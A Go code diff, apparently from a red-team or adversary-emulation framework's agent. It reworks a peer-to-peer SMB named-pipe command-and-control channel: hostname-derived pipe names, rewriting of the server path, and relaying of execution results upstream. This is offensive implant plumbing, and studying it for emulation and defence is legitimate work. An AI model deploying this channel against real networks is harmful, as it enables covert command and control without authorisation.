@@ -9,6 +9,8 @@ import (
     "encoding/json"
     "time"
     "io"
+    "regexp"
+    "os"
     "math/rand"
     "errors"
     "strings"
@@ -22,8 +24,8 @@ import (
 	_ "../executors/shells"    // necessary to initialize all submodules
 )
 
-const pipeLetters = "abcdefghijklmnopqrstuvwxyz"
-const numPipeLetters = int64(len(pipeLetters))
+const pipeCharacters = "abcdefghijklmnopqrstuvwxyz"
+const numPipeCharacters = int64(len(pipeCharacters))
 const clientPipeNameMinLen = 10
 const clientPipeNameMaxLen = 15
 const maxChunkSize = 5*4096
@@ -39,7 +41,7 @@ type SmbPipeReceiver struct {
 }
 
 func init() {
-	contact.CommunicationChannels["P2pSmbPipe"] = SmbPipeAPI{}
+	P2pClientChannels["SmbPipe"] = SmbPipeAPI{}
 	P2pReceiverChannels["SmbPipe"] = &SmbPipeReceiver{}
 }
 
@@ -47,8 +49,13 @@ func init() {
 
 // Listen on agent's main pipe for client connection. This main pipe will only respond to client requests with
 // a unique pipe name for the client to resend the request to.
-func (receiver *SmbPipeReceiver) StartReceiver(profile map[string]interface{}, p2pReceiverConfig map[string]string, upstreamComs contact.Contact) {
-    pipePath := "\\\\.\\pipe\\" + p2pReceiverConfig["p2pReceiver"]
+func (receiver *SmbPipeReceiver) StartReceiver(profile map[string]interface{}, upstreamComs contact.Contact) {
+	hostname, err := os.Hostname()
+	if err != nil {
+		output.VerbosePrint(fmt.Sprintf("[-] Error: cannot set up main pipe. Error obtaining hostname %v", err))
+		return
+	}
+    pipePath := "\\\\.\\pipe\\" + getMainPipeName(hostname)
 
     // Give the receiver the original server value.
     receiver.Server = profile["server"].(string)
@@ -65,7 +72,7 @@ func (receiver *SmbPipeReceiver) startReceiverHelper(profile map[string]interfac
     }
     receiver.Listener = listener
     defer receiver.Listener.Close()
-    output.VerbosePrint("[*] Listening on main handler pipe")
+    output.VerbosePrint(fmt.Sprintf("[*] Listening on main handler pipe %s", pipePath))
 
     // Whenever a new client connects to pipe with a request, generate a new individual pipe for that client, listen on that pipe,
     // and give the pipe name to the client.
@@ -95,8 +102,7 @@ func (receiver *SmbPipeReceiver) startReceiverHelper(profile map[string]interfac
 // Also notify the client of this new pipe name.
 func (receiver *SmbPipeReceiver) setIndividualClientPipe(profile map[string]interface{}) {
     // Create random pipe name
-    rand.Seed(time.Now().UnixNano())
-    clientPipeName := getRandPipeName(rand.Intn(clientPipeNameMaxLen - clientPipeNameMinLen) + clientPipeNameMinLen)
+    clientPipeName := getRandPipeName(time.Now().UnixNano())
     clientPipePath := "\\\\.\\pipe\\" + clientPipeName
 
     // Start individual receiver on client pipe and send name to client.
@@ -390,7 +396,16 @@ func (p2pPipeClient SmbPipeAPI) RunInstruction(command map[string]interface{}, p
  	p2pPipeClient.SendExecutionResults(profile, result)
 }
 
-func (p2pPipeClient SmbPipeAPI) C2RequirementsMet(criteria map[string]string) bool {
+// Check if current server is a full pipe path. If not, change profile server
+// to full pipe path using current server value and default generated pipe name.
+func (p2pPipeClient SmbPipeAPI) C2RequirementsMet(profile map[string]interface{}, criteria map[string]string) bool {
+	currentServer := profile["server"].(string)
+	match, _ := regexp.MatchString(`^\\\\[^\\]+\\pipe\\[^\\]+$`, currentServer)
+	if !match {
+		newServer := "\\\\" + currentServer + "\\pipe\\" + getMainPipeName(currentServer)
+		output.VerbosePrint(fmt.Sprintf("[*] Changing server value to full pipe path %s", newServer))
+		profile["server"] = newServer
+	}
     return true
 }
 
@@ -400,7 +415,6 @@ func (p2pPipeClient SmbPipeAPI) SendExecutionResults(profile map[string]interfac
     profileCopy := profile
 	profileCopy["result"] = result
 	payload, _ := json.Marshal(profileCopy)
-    output.VerbosePrint(fmt.Sprintf("[*] P2p Client: going to send execution results to %s", profile["server"].(string)))
     serverResp, err := p2pPipeClient.sendRequestToServer(profile["server"].(string), profile["paw"].(string), SEND_EXECUTION_RESULTS, payload)
 
     if err == nil {
@@ -491,14 +505,25 @@ func listenPipeFullAccess(pipePath string) (net.Listener, error) {
     return winio.ListenPipe(pipePath, config)
 }
 
-// Helper function that creates random string of specified length using letters a-z
-func getRandPipeName(length int) string {
-    rand.Seed(time.Now().UnixNano())
+// Helper function that creates random pipename of random length, using specified seed.
+func getRandPipeName(seed int64) string {
+    rand.Seed(seed)
+    length := rand.Intn(clientPipeNameMaxLen - clientPipeNameMinLen) + clientPipeNameMinLen
     buffer := make([]byte, length)
     for i := range buffer {
-        buffer[i] = pipeLetters[rand.Int63() % numPipeLetters]
+        buffer[i] = pipeCharacters[rand.Int63() % numPipeCharacters]
     }
     return string(buffer)
+}
+
+// Helper function that creates a static main pipename using the given string to calculate seed for RNG.
+// Pipe name length will also be determined using the string.
+func getMainPipeName(seedStr string) string {
+	seedNum := 0
+	for i, rune := range seedStr {
+		seedNum += i*int(rune)
+	}
+	return getRandPipeName(int64(seedNum))
 }
 
 // Sends data to specified pipe connection. Returns total number of bytes written and errors if any.
